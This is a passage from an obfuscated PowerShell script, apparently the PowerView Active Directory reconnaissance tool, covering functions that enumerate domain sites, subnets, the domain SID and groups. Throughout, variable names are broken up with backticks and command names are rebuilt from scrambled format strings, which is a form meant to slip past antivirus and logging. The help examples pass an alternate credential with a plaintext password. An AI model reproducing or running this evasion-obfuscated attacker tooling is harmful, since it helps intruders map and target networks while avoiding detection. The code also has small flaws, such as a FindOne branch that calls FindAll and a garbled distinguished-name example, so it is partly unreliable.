        [Alias('ADSPath')]
        [String]
        ${S`EAR`ChbA`Se},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${S`eRv`eR},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${S`EarC`HSCo`Pe} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${re`Sult`Page`S`iZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SerVErt`i`M`e`limiT},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${s`ecURitymAs`Ks},

        [Switch]
        ${ToMb`sTO`NE},

        [Alias('ReturnOne')]
        [Switch]
        ${fI`NDo`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REDeN`TI`Al} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${r`AW}
    )

    BEGIN {
        ${s`eARchEr`ARGumEn`TS} = @{
            'SearchBasePrefix' = 'CN=Sites,CN=Configuration'
        }
        if (${p`sBO`U`Ndp`Ar`AmEtERs}['Domain']) { ${seArCH`e`RarguME`NTS}['Domain'] = ${DO`M`AiN} }
        if (${PsbOUnd`p`Ar`A`METers}['Properties']) { ${SeaR`c`he`RArGuM`EnTS}['Properties'] = ${Pr`op`er`TiEs} }
        if (${P`s`B`o`UnDpArAm`etERs}['SearchBase']) { ${SE`AR`cHe`RArGUMEnTs}['SearchBase'] = ${s`EAr`CHBase} }
        if (${Psb`OU`Nd`PAraMetERS}['Server']) { ${SE`A`RCHE`RarGuME`NtS}['Server'] = ${seR`V`eR} }
        if (${PSB`ouND`p`ArA`METeRS}['SearchScope']) { ${Se`A`RCher`A`RgU`mENts}['SearchScope'] = ${s`EA`RcHSco`Pe} }
        if (${P`sbounD`p`ArAME`TErS}['ResultPageSize']) { ${SEArChe`RaRG`UMEn`TS}['ResultPageSize'] = ${Re`s`U`LtpaGeS`IZe} }
        if (${pSbOUn`d`pArA`MEtERS}['ServerTimeLimit']) { ${seARc`H`e`RaRGUmeNTS}['ServerTimeLimit'] = ${SErvER`Tim`eL`imIT} }
        if (${p`sBOUn`dPaRaME`TErs}['SecurityMasks']) { ${S`eaRc`h`ERarguMEnTS}['SecurityMasks'] = ${seCu`RiTym`As`ks} }
        if (${psbo`U`NdPA`RaMET`e`Rs}['Tombstone']) { ${SEAR`C`hERaRg`UMeNTS}['Tombstone'] = ${TO`mb`stO`Ne} }
        if (${P`sb`oU`NDparAm`ETERS}['Credential']) { ${Sear`che`RarGUm`eNTs}['Credential'] = ${Cre`d`ENtiAL} }
        ${SI`T`Es`eA`RChER} = &("{3}{2}{0}{1}{4}" -f 'omainS','ea','-D','Get','rcher') @SearcherArguments
    }

    PROCESS {
        if (${S`It`EsEArChEr}) {
            ${Id`ent`iT`yFiL`Ter} = ''
            ${FI`lter} = ''
            ${I`De`NTity} | &("{1}{2}{0}{3}"-f 'r','W','he','e-Object') {${_}} | &("{0}{3}{2}{1}{4}" -f'Fo','-Obje','Each','r','ct') {
                ${i`Dent`ITyInSTAn`ce} = ${_}.Replace('(', '\28').Replace(')', '\29')
                if (${IdENTi`T`Y`inS`TANce} -match '^CN=.*') {
                    ${IdENTIt`yfil`Ter} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${P`SBoundp`ARAmeTe`Rs}['Domain']) -and (-not ${Ps`BOU`NdPaR`AmET`ERS}['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        ${idEN`TitY`dO`MAIn} = ${Id`EntiT`Yin`sT`Ance}.SubString(${Id`EnTi`TYINs`Ta`NCe}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{1}{2}{3}{0}"-f'se','Write','-V','erbo') "[Get-DomainSite] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        ${sE`Ar`ch`ERArGUMeNts}['Domain'] = ${idE`NTI`TyDOM`AIN}
                        ${SI`TESEaR`cHEr} = &("{0}{3}{4}{2}{1}{5}" -f 'Get-','che','inSear','Do','ma','r') @SearcherArguments
                        if (-not ${s`iTeS`eARCH`Er}) {
                            &("{1}{3}{0}{2}"-f 'e-War','W','ning','rit') "[Get-DomainSite] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                else {
                    try {
                        ${gu`I`d`BYTeStrinG} = (-Join (([Guid]${i`dEnT`ItyI`N`s`TAnce}).ToByteArray() | &("{2}{0}{1}" -f'ach-Obje','ct','ForE') {${_}.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        ${idE`N`TItyFI`LTEr} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${IDE`NTi`TYFILter} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${ID`En`Ti`TYFiL`Ter} -and (${I`d`EnTItY`FiL`Ter}.Trim() -ne '') ) {
                ${fI`LTER} += "(|$IdentityFilter)"
            }

            if (${psbou`NDPARam`e`T`erS}['GPLink']) {
                &("{1}{3}{0}{2}"-f'er','W','bose','rite-V') "[Get-DomainSite] Searching for sites with $GPLink set in the gpLink property"
                ${filt`eR} += "(gplink=*$GPLink*)"
            }

            if (${psB`O`U`Ndp`ARAMeTE`Rs}['LDAPFilter']) {
                &("{1}{0}{2}{3}"-f'it','Wr','e','-Verbose') "[Get-DomainSite] Using additional LDAP filter: $LDAPFilter"
                ${f`IltEr} += "$LDAPFilter"
            }

            ${SI`TEs`EArc`Her}.filter = "(&(objectCategory=site)$Filter)"
            &("{4}{3}{0}{2}{1}"-f'b','e','os','Ver','Write-') "[Get-DomainSite] Get-DomainSite filter string: $($SiteSearcher.filter)"

            if (${psb`o`UN`dpaRAmETe`Rs}['FindOne']) { ${r`ESUlts} = ${S`ItEseA`RCh`eR}.FindAll() }
            else { ${R`eS`ULtS} = ${Sit`Esearch`er}.FindAll() }
            ${RES`ULTS} | &("{1}{3}{2}{0}" -f'e-Object','Wh','r','e') {${_}} | &("{4}{3}{0}{2}{1}" -f 'a','bject','ch-O','E','For') {
                if (${pSBoU`NDPARa`Met`ERS}['Raw']) {
                    # return raw result objects
                    ${S`itE} = ${_}
                }
                else {
                    ${s`ite} = &("{2}{1}{3}{6}{4}{0}{5}"-f 'APP','onv','C','ert','LD','roperty','-') -Properties ${_}.Properties
                }
                ${SI`Te}.PSObject.TypeNames.Insert(0, 'PowerView.Site')
                ${SI`Te}
            }
            if (${re`S`UltS}) {
                try { ${R`ESul`Ts}.dispose() }
                catch {
                    &("{2}{3}{4}{1}{0}" -f 'e','s','Write','-','Verbo') "[Get-DomainSite] Error disposing of the Results object"
                }
            }
            ${S`itesEa`RCH`ER}.dispose()
        }
    }
}


function G`Et-DOm`AI`NsUbn`ET {
<#
.SYNOPSIS

Search for all subnets or specific subnets objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties whencreated,usnchanged,...". By default, all subnet objects for
the current domain are returned.

.PARAMETER Identity

An subnet name (e.g. '192.168.50.0/24'), DistinguishedName (e.g. 'CN=192.168.50.0/24,CN=Subnets,CN=Sites,CN=Configuratioiguration,DC=testlab,DC=local'),
or GUID (e.g. c37726ef-2b64-4524-b85b-6a9700c234dd). Wildcards accepted.

.PARAMETER SiteName

Only return subnets from the specified SiteName.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainSubnet

Returns the current subnets in the domain.

.EXAMPLE

Get-DomainSubnet *admin* -Domain testlab.local

Returns all subnets with "admin" in their name in the testlab.local domain.

.EXAMPLE

Get-DomainSubnet -GPLink "F260B76D-55C8-46C5-BEF1-9016DD98E272"

Returns all subnets with linked to the specified group policy object.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainSubnet -Credential $Cred

.OUTPUTS

PowerView.Subnet

Custom PSObject with translated subnet property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = ${tR`Ue}, ValueFromPipelineByPropertyName = ${TR`UE})]
        [Alias('Name')]
        [String[]]
        ${iden`TIty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${si`Te`N`AMe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`OmaIn},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${l`DApfI`l`TER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${P`R`O`PERTIeS},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${sEa`RC`HbasE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${Serv`er},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${se`ArC`hScoPE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`sULt`Pa`GeS`Ize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`RvEr`T`imE`limIt},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${S`EcUri`Ty`MA`sks},

        [Switch]
        ${T`OMbsT`ONE},

        [Alias('ReturnOne')]
        [Switch]
        ${Fi`ND`OnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`Re`DenT`IAL} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${r`AW}
    )

    BEGIN {
        ${sE`A`Rc`H`eRargUmENTs} = @{
            'SearchBasePrefix' = 'CN=Subnets,CN=Sites,CN=Configuration'
        }
        if (${p`S`BounD`PaR`AMet`ErS}['Domain']) { ${SE`AR`ch`ERAr`GuMe`NTS}['Domain'] = ${D`Om`AIn} }
        if (${PSBO`UNd`paR`AmE`TeRS}['Properties']) { ${seA`RC`heRArG`UM`ents}['Properties'] = ${pRop`e`RTiEs} }
        if (${PsB`Ou`NDP`ArametERs}['SearchBase']) { ${S`Ea`RCHe`RaR`g`UMEnts}['SearchBase'] = ${SE`A`RChBA`SE} }
        if (${P`sB`oUnDP`ArA`mETERS}['Server']) { ${sEA`R`ChEr`ARgum`e`NTs}['Server'] = ${Serv`er} }
        if (${ps`BO`U`Nd`ParaMetErs}['SearchScope']) { ${Sea`R`CHERARgu`me`NTS}['SearchScope'] = ${s`eAR`ChSCO`Pe} }
        if (${pS`Boun`dpAr`AMetERs}['ResultPageSize']) { ${S`EaR`ChERArGuM`en`Ts}['ResultPageSize'] = ${rEs`Ul`TpAGe`siZE} }
        if (${psbo`UndP`Aram`eTers}['ServerTimeLimit']) { ${seaR`chERA`Rg`UMents}['ServerTimeLimit'] = ${S`E`RVEr`TImELiMIt} }
        if (${PSbO`UN`DparameTe`RS}['SecurityMasks']) { ${sEarc`H`ErAr`Gu`Me`Nts}['SecurityMasks'] = ${SECURiTY`MA`S`ks} }
        if (${Psb`oUnd`Par`AM`Et`ERS}['Tombstone']) { ${Sea`RCHeRARg`Ume`NTS}['Tombstone'] = ${T`ombst`onE} }
        if (${psBoU`N`DpAraM`eTErs}['Credential']) { ${SeArCHeRAR`G`UmE`N`TS}['Credential'] = ${Cre`DEn`TIAL} }
        ${S`UBneTsea`RcHeR} = &("{2}{3}{1}{0}{4}"-f'r','mainSea','Get-','Do','cher') @SearcherArguments
    }

    PROCESS {
        if (${Sub`N`EtSEarc`H`Er}) {
            ${ideN`Ti`TyF`il`TeR} = ''
            ${FI`l`Ter} = ''
            ${idEnt`ItY} | &("{1}{0}{2}"-f'here','W','-Object') {${_}} | &("{0}{3}{1}{2}"-f 'ForE','ch-Objec','t','a') {
                ${i`dENti`T`yi`NSTaNce} = ${_}.Replace('(', '\28').Replace(')', '\29')
                if (${I`deN`TitYin`staN`cE} -match '^CN=.*') {
                    ${idEN`TIty`FI`L`TeR} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${PSBO`UNd`pAramET`Ers}['Domain']) -and (-not ${psb`O`Un`dpArAmeT`ERs}['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        ${idenTiT`YdoM`A`IN} = ${iDeNtIt`YI`NSta`Nce}.SubString(${IDeNt`ITYInS`Ta`N`ce}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{2}{1}{3}{0}{4}"-f'-Ver','r','W','ite','bose') "[Get-DomainSubnet] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        ${SEArCher`AR`gU`M`ENTS}['Domain'] = ${I`deN`Ti`TYDoMAiN}
                        ${subn`etsE`Ar`C`heR} = &("{2}{1}{3}{0}" -f'archer','et-Doma','G','inSe') @SearcherArguments
                        if (-not ${sUBneT`sE`A`RChER}) {
                            &("{0}{2}{3}{1}" -f 'W','te-Warning','r','i') "[Get-DomainSubnet] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                else {
                    try {
                        ${gUI`D`BYtEsTrinG} = (-Join (([Guid]${IDENTIT`YI`NStAN`ce}).ToByteArray() | &("{3}{0}{2}{4}{1}"-f'a','ect','ch-Ob','ForE','j') {${_}.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        ${IdE`NT`itYF`ilt`er} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${iDEN`TItY`F`ilTer} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${IdENT`ItyF`i`l`TEr} -and (${I`dEnT`ItyFi`lT`er}.Trim() -ne '') ) {
                ${f`i`ltER} += "(|$IdentityFilter)"
            }

            if (${PSB`OuNdPa`Ramete`Rs}['LDAPFilter']) {
                &("{1}{3}{2}{0}" -f 'rbose','Wr','e','ite-V') "[Get-DomainSubnet] Using additional LDAP filter: $LDAPFilter"
                ${f`iLteR} += "$LDAPFilter"
            }

            ${su`BNet`SEar`ch`er}.filter = "(&(objectCategory=subnet)$Filter)"
            &("{1}{3}{0}{2}" -f'te-Verbo','W','se','ri') "[Get-DomainSubnet] Get-DomainSubnet filter string: $($SubnetSearcher.filter)"

            if (${P`S`BoUNDPAram`ETeRs}['FindOne']) { ${r`es`ULTS} = ${SUB`Ne`T`seArCher}.FindOne() }
            else { ${R`Esu`Lts} = ${Subne`Ts`E`A`RCHer}.FindAll() }
            ${ResU`lts} | &("{1}{2}{0}"-f'ct','Where-Obj','e') {${_}} | &("{1}{3}{2}{0}"-f 'bject','F','ch-O','orEa') {
                if (${p`sbOUn`dPAr`AMEtERs}['Raw']) {
                    # return raw result objects
                    ${Su`BneT} = ${_}
                }
                else {
                    ${sUBn`ET} = &("{1}{2}{3}{0}{4}" -f'LDA','Conv','ert','-','PProperty') -Properties ${_}.Properties
                }
                ${sU`B`NET}.PSObject.TypeNames.Insert(0, 'PowerView.Subnet')

                if (${PS`B`OuNdparAmEt`e`RS}['SiteName']) {
                    # have to do the filtering after the LDAP query as LDAP doesn't let you specify
                    #   wildcards for 'siteobject' :(
                    if (${SU`BnEt}.properties -and (${S`U`BNET}.properties.siteobject -like "*$SiteName*")) {
                        ${SuBN`ET}
                    }
                    elseif (${s`UBNeT}.siteobject -like "*$SiteName*") {
                        ${S`UB`Net}
                    }
                }
                else {
                    ${S`Ub`NEt}
                }
            }
            if (${r`esU`LtS}) {
                try { ${re`S`ULTS}.dispose() }
                catch {
                    &("{4}{2}{1}{3}{0}" -f 'erbose','te-','i','V','Wr') "[Get-DomainSubnet] Error disposing of the Results object: $_"
                }
            }
            ${Su`Bnet`se`A`RCHeR}.dispose()
        }
    }
}


function Ge`T-D`o`MAINSiD {
<#
.SYNOPSIS

Returns the SID for the current domain or the specified domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer  

.DESCRIPTION

Returns the SID for the current domain or the specified domain by executing
Get-DomainComputer with the -LDAPFilter set to (userAccountControl:1.2.840.113556.1.4.803:=8192)
to search for domain controllers through LDAP. The SID of the returned domain controller
is then extracted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainSID

.EXAMPLE

Get-DomainSID -Domain testlab.local

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainSID -Credential $Cred

.OUTPUTS

String

A string representing the specified domain SID.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        ${do`mA`iN},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${s`erver},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrEDe`NT`IAl} = [Management.Automation.PSCredential]::Empty
    )

    ${s`e`ArCH`eRaRGUMEnTS} = @{
        'LDAPFilter' = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    if (${PsbO`UND`pArAMe`TERS}['Domain']) { ${sE`AR`Cher`ARgu`MEn`TS}['Domain'] = ${DOM`Ain} }
    if (${P`SB`o`UNDp`ARAme`TERs}['Server']) { ${s`EArcheraR`gUME`NTS}['Server'] = ${Se`Rver} }
    if (${pSBo`Un`Dp`ARame`T`eRS}['Credential']) { ${s`eArc`herARgumEN`TS}['Credential'] = ${CREd`EN`T`iaL} }

    ${D`cSID} = &("{0}{1}{4}{2}{3}" -f'Ge','t','nC','omputer','-Domai') @SearcherArguments -FindOne | &("{2}{1}{0}"-f 'ct-Object','ele','S') -First 1 -ExpandProperty ("{0}{2}{1}"-f'object','d','si')

    if (${dc`sid}) {
        ${dC`SID}.SubString(0, ${DCs`iD}.LastIndexOf('-'))
    }
    else {
        &("{4}{2}{3}{0}{1}"-f 'bo','se','ri','te-Ver','W') "[Get-DomainSID] Error extracting domain SID for '$Domain'"
    }
}


function GE`T-`DO`mainGrOUp {
<#
.SYNOPSIS

Return all groups or specific group objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-DomainObject, Convert-ADName, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties samaccountname,usnchanged,...". By default, all group objects for
the current domain are returned. To return the groups a specific user/group is
a part of, use -MemberIdentity X to execute token groups enumeration.

.PARAMETER Identity

A SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the group to query for. Wildcards accepted.

.PARAMETER MemberIdentity

A SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the user/group member to query for group membership.

.PARAMETER AdminCount

Switch. Return users with '(adminCount=1)' (meaning are/were privileged).

.PARAMETER GroupScope

Specifies the scope (DomainLocal, Global, or Universal) of the group(s) to search for.
Also accepts NotDomainLocal, NotGloba, and NotUniversal as negations.

.PARAMETER GroupProperty

Specifies a specific property to search for when performing the group search.
Possible values are Security, Distribution, CreatedBySystem, and NotCreatedBySystem.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainGroup | select samaccountname

samaccountname
--------------
WinRMRemoteWMIUsers__
Administrators
Users
Guests
Print Operators
Backup Operators
...

.EXAMPLE

Get-DomainGroup *admin* | select distinguishedname

distinguishedname
-----------------
CN=Administrators,CN=Builtin,DC=testlab,DC=local
CN=Hyper-V Administrators,CN=Builtin,DC=testlab,DC=local
CN=Schema Admins,CN=Users,DC=testlab,DC=local
CN=Enterprise Admins,CN=Users,DC=testlab,DC=local
CN=Domain Admins,CN=Users,DC=testlab,DC=local
CN=DnsAdmins,CN=Users,DC=testlab,DC=local
CN=Server Admins,CN=Users,DC=testlab,DC=local
CN=Desktop Admins,CN=Users,DC=testlab,DC=local

.EXAMPLE

Get-DomainGroup -Properties samaccountname -Identity 'S-1-5-21-890171859-3433809279-3366196753-1117' | fl

samaccountname
--------------
Server Admins

.EXAMPLE

'CN=Desktop Admins,CN=Users,DC=testlab,DC=local' | Get-DomainGroup -Server primary.testlab.local -Verbose
VERBOSE: Get-DomainSearcher search string: LDAP://DC=testlab,DC=local
VERBOSE: Get-DomainGroup filter string: (&(objectCategory=group)(|(distinguishedname=CN=DesktopAdmins,CN=Users,DC=testlab,DC=local)))

usncreated            : 13245
grouptype             : -2147483646
samaccounttype        : 268435456
samaccountname        : Desktop Admins
whenchanged           : 8/10/2016 12:30:30 AM
objectsid             : S-1-5-21-890171859-3433809279-3366196753-1118
objectclass           : {top, group}
cn                    : Desktop Admins
usnchanged            : 13255
dscorepropagationdata : 1/1/1601 12:00:00 AM
name                  : Desktop Admins
distinguishedname     : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
member                : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
whencreated           : 8/10/2016 12:29:43 AM
instancetype          : 4
objectguid            : f37903ed-b333-49f4-abaa-46c65e9cca71
objectcategory        : CN=Group,CN=Schema,CN=Configuration,DC=testlab,DC=local

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGroup -Credential $Cred

.EXAMPLE

Get-Domain | Select-Object -Expand name
testlab.local

'DEV\Domain Admins' | Get-DomainGroup -Verbose -Properties distinguishedname
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainGroup] Extracted domain 'dev.testlab.local' from 'DEV\Domain Admins'
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainGroup] filter string: (&(objectCategory=group)(|(samAccountName=Domain Admins)))

distinguishedname
-----------------
CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local

.OUTPUTS

PowerView.Group

Custom PSObject with translated group property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`RUE}, ValueFromPipelineByPropertyName = ${tR`UE})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        ${idE`NT`ItY},

        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        ${MeMB`er`idENt`I`Ty},

        [Switch]
        ${aD`mInco`U`Nt},

        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        ${Gr`ouPs`cOPe},

        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        ${grOUp`PrO`PE`R`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`omAIN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${L`d`APFIlt`Er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Pr`opeR`TieS},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${sear`CHba`sE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${s`e`Rver},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${SeA`R`C`HScope} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${Res`U`lTPagEsiZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SEr`Ve`RT`I`MELimiT},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${s`Ecu`RI`TYMa`SKs},

        [Switch]
        ${T`om`BS`TOne},

        [Alias('ReturnOne')]
        [Switch]
        ${F`iN`DONe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`RedENti`Al} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${seARCHER`AR`g`Ume`N`Ts} = @{}
        if (${P`S`BOUnD`PARA`m`eTerS}['Domain']) { ${S`EArCheRa`RGU`menTS}['Domain'] = ${DO`m`AIN} }
        if (${p`Sb`OUNdp`ArAMEteRs}['Properties']) { ${Sea`R`CHeRARGu`ments}['Properties'] = ${PRop`eR`T`ies} }
        if (${psBOU`NDPARA`M`etERs}['SearchBase']) { ${seAR`cH`E`RargUmE`N`TS}['SearchBase'] = ${seA`RCHb`Ase} }
        if (${PsBo`Un`dpArA`M`eTers}['Server']) { ${SeaRC`heRAR`gu`mE`NTs}['Server'] = ${S`E`RVER} }
        if (${P`s`BoUNdP`A`RaM`etErS}['SearchScope']) { ${SEAR`chE`R`A`RgU`mENTs}['SearchScope'] = ${se`ArC`HsC`opE} }
        if (${PsbO`UN`dPARAmE`TERS}['ResultPageSize']) { ${s`eARc`H`ERaRgU`ME`NtS}['ResultPageSize'] = ${res`U`LtPAges`iZe} }
        if (${PsB`OundPaR`AME`TeRS}['ServerTimeLimit']) { ${S`eAr`cHer`ArGuME`NtS}['ServerTimeLimit'] = ${sERV`er`TImeL`imIt} }
        if (${pSBoUndP`AR`Am`e`TE`Rs}['SecurityMasks']) { ${s`E`Ar`ChERArGUMENTS}['SecurityMasks'] = ${SeCuR`I`TymA`skS} }
        if (${pSb`OUn`dpara`m`EtERS}['Tombstone']) { ${SeA`R`cherAR`G`UM`eNTS}['Tombstone'] = ${TOM`Bs`Tone} }
        if (${PSBo`U`NDPaRaMET`ErS}['Credential']) { ${S`EAr`C`HerA`RGUMe`NTS}['Credential'] = ${CReDE`Nt`ial} }
        ${G`ROUpSe`A`RcHER} = &("{2}{4}{0}{3}{1}" -f 'nS','er','Ge','earch','t-Domai') @SearcherArguments
    }

    PROCESS {
        if (${gROuPS`e`ARcH`Er}) {
            if (${psbou`Nd`p`ARaMe`TE`RS}['MemberIdentity']) {

                if (${SearC`herA`RGu`Me`NTS}['Properties']) {
                    ${O`LDPROP`ErTI`es} = ${sEARchE`R`A`RG`U`Ments}['Properties']
                }

                ${SEa`RCHERa`R`GUm`EN`TS}['Identity'] = ${MeMber`i`de`Nti`TY}
                ${sEArC`hEraRg`U`ments}['Raw'] = ${TR`UE}

                &("{1}{0}{2}{3}"-f'et-Dom','G','ainObj','ect') @SearcherArguments | &("{2}{0}{1}{3}" -f 'rE','ach','Fo','-Object') {
                    # convert the user/group to a directory entry
                    ${obj`eCtdir`Ect`o`RYentrY} = ${_}.GetDirectoryEntry()

